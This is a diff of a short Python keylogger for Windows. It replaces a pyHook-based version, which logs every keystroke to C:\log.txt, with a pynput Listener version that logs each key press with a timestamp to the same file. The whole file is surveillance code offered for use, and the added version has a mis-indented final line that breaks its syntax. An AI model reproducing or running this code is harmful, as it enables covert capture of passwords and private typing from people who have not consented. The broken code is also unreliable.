@@ -1,15 +1,10 @@
-# Python code for keylogger 
-# to be used in windows 
-import pythoncom, pyHook, sys, logging
-
-log_file = 'C:\\log.txt'  
-def OnKeyboardEvent(event):
-    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')
-    chr(event.Ascii)
-    logging.log(10, chr(event.Ascii))
-    return True 
+#pynput module pip install is required for this code to work
+from pynput.keyboard import Key, Listener
+import logging
+log_dir = r"C:/log.txt"
+logging.basicConfig(filename = ("" + log_dir), level=logging.DEBUG, format='%(asctime)s: %(message)s') 
+def on_press(key):
+   logging.info(str(key))
 # create a hook manager object 
-hm = pyHook.HookManager() 
-hm.KeyDown = OnKeyboardEvent 
-hm.HookKeyboard() 
-pythoncom.PumpMessages()
+with Listener(on_press=on_press) as listener:
+listener.join()
